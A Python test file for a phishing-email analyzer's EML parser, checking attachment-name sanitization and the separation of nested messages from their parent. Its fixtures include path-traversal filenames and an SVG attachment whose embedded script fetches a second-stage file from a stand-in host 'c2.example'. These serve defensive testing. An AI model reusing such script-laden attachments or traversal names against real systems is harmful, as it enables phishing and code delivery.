"""Nested-EML handling: spawn-only semantics, no merge into parent."""

from pathlib import Path

from darla.analysis.eml_parser import EMLParser, NestedEML, _safe_attachment_name

# ---- Filename sanitization ----------------------------------------------


def test_safe_attachment_name_strips_trailing_dots():
    """Phishing attachments use names like "ATT021.svg.." to defeat
    extension-based classifiers. Must strip trailing dots/spaces."""
    assert _safe_attachment_name("ATT021.svg..") == "ATT021.svg"
    assert _safe_attachment_name("payload.pdf. ") == "payload.pdf"
    assert _safe_attachment_name("doc.docx.") == "doc.docx"


def test_safe_attachment_name_strips_path_components():
    assert _safe_attachment_name("../../etc/passwd") == "passwd"
    assert _safe_attachment_name("subdir\\evil.exe") == "evil.exe"


def test_safe_attachment_name_strips_reserved_chars():
    out = _safe_attachment_name('bad<name>:"file".svg')
    assert "<" not in out and ">" not in out and ":" not in out
    assert out.endswith(".svg")


def test_safe_attachment_name_empty_fallback():
    assert _safe_attachment_name(None) == "attachment"
    assert _safe_attachment_name("") == "attachment"
    assert _safe_attachment_name("...") == "attachment"


def _make_outer_eml(inner_body: bytes) -> bytes:
    """Compose a multipart EML with a message/rfc822 attachment."""
    return (
        b"From: attacker@evil.example\r\n"
        b"To: victim@corp.example\r\n"
        b"Subject: Outer envelope\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="BOUND"\r\n\r\n'
        b"--BOUND\r\n"
        b"Content-Type: text/plain\r\n\r\n"
        b"See attached message.\r\n"
        b"--BOUND\r\n"
        b"Content-Type: message/rfc822\r\n"
        b'Content-Disposition: attachment; filename="inner.eml"\r\n\r\n'
        + inner_body
        + b"\r\n--BOUND--\r\n"
    )


def _make_inner_eml_with_attachment() -> bytes:
    return (
        b"From: inner-sender@phish.example\r\n"
        b"To: victim@corp.example\r\n"
        b"Subject: Inner body\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="INNER"\r\n\r\n'
        b"--INNER\r\n"
        b"Content-Type: text/html\r\n\r\n"
        b'<html><body><a href="https://inner-link.example/x">click</a></body></html>\r\n'
        b"--INNER\r\n"
        b'Content-Type: image/svg+xml; name="doc.svg"\r\n'
        b'Content-Disposition: attachment; filename="doc.svg"\r\n\r\n'
        b"<svg><script>fetch('https://c2.example/stage2.js')</script></svg>\r\n"
        b"--INNER--\r\n"
    )


# ---- Spawn-only: no content merge ----------------------------------------


def test_nested_eml_is_not_merged_into_parent():
    inner = _make_inner_eml_with_attachment()
    outer = _make_outer_eml(inner)
    result = EMLParser().parse_bytes(outer)

    # Outer sees the nested EML but does NOT absorb its attachments / links
    assert len(result.nested_emls) == 1
    assert isinstance(result.nested_emls[0], NestedEML)
    # Outer attachments must NOT include the SVG from the inner EML
    assert not any(a.filename == "doc.svg" for a in result.attachments)
    # Outer links must NOT include the inner link
    assert not any("inner-link.example" in link for link in result.links)


def test_nested_eml_preserves_inner_bytes():
    inner = _make_inner_eml_with_attachment()
    outer = _make_outer_eml(inner)
    result = EMLParser().parse_bytes(outer)

    nested = result.nested_emls[0]
    # Inner bytes are preserved verbatim for child-kit spawn
    assert b"inner-sender@phish.example" in nested.data
    assert b"doc.svg" in nested.data
    assert nested.size == len(nested.data)
    assert nested.filename.endswith(".eml")


def test_nested_eml_filename_fallback_to_subject():
    """When the attachment has no filename, synthesize one from Subject."""
    inner = (
        b"From: x@y.example\r\n"
        b"Subject: Quarterly Update Q1\r\n\r\n"
        b"body\r\n"
    )
    # Build outer WITHOUT filename on the rfc822 part
    outer = (
        b"From: a@b.example\r\n"
        b"Subject: outer\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="B"\r\n\r\n'
        b"--B\r\n"
        b"Content-Type: message/rfc822\r\n\r\n"
        + inner
        + b"\r\n--B--\r\n"
    )
    result = EMLParser().parse_bytes(outer)
    assert len(result.nested_emls) == 1
    assert "Quarterly Update" in result.nested_emls[0].filename


# ---- save_nested_emls ---------------------------------------------------


def test_save_nested_emls_writes_to_disk(tmp_path: Path):
    inner = _make_inner_eml_with_attachment()
    outer = _make_outer_eml(inner)
    parser = EMLParser()
    result = parser.parse_bytes(outer)

    saved = parser.save_nested_emls(result, str(tmp_path))
    assert len(saved) == 1

    _, nested_path = saved[0]
    assert Path(nested_path).is_file()
    assert Path(nested_path).suffix == ".eml"
    # Must land under the _nested_emls subdir to avoid being rescanned as
    # an attachment of the outer kit
    assert "_nested_emls" in nested_path
    # Bytes round-trip
    assert Path(nested_path).read_bytes() == inner


def test_save_nested_emls_collision_safe(tmp_path: Path):
    """Two nested EMLs with identical subject/filename must not overwrite each other."""
    inner1 = (
        b"From: a@b.example\r\n"
        b"Subject: dup\r\n\r\n"
        b"one\r\n"
    )
    inner2 = (
        b"From: c@d.example\r\n"
        b"Subject: dup\r\n\r\n"
        b"two\r\n"
    )
    outer = (
        b"From: outer@b.example\r\n"
        b"MIME-Version: 1.0\r\n"
        b'Content-Type: multipart/mixed; boundary="B"\r\n\r\n'
        b"--B\r\nContent-Type: message/rfc822\r\n\r\n"
        + inner1
        + b"\r\n--B\r\nContent-Type: message/rfc822\r\n\r\n"
        + inner2
        + b"\r\n--B--\r\n"
    )
    parser = EMLParser()
    result = parser.parse_bytes(outer)
    saved = parser.save_nested_emls(result, str(tmp_path))
    assert len(saved) == 2
    # Distinct paths on disk
    paths = {s[1] for s in saved}
    assert len(paths) == 2


def test_outer_envelope_headers_still_extractable():
    """Outer envelope must still carry From/Subject even after spawn-only switch."""
    inner = _make_inner_eml_with_attachment()
    outer = _make_outer_eml(inner)
    result = EMLParser().parse_bytes(outer)
    assert result.headers.get("From", "").startswith(
        ("attacker@evil.example", "<attacker@evil.example>")
    ) or "attacker@evil.example" in result.headers.get("From", "")
    assert "Outer envelope" in result.headers.get("Subject", "")
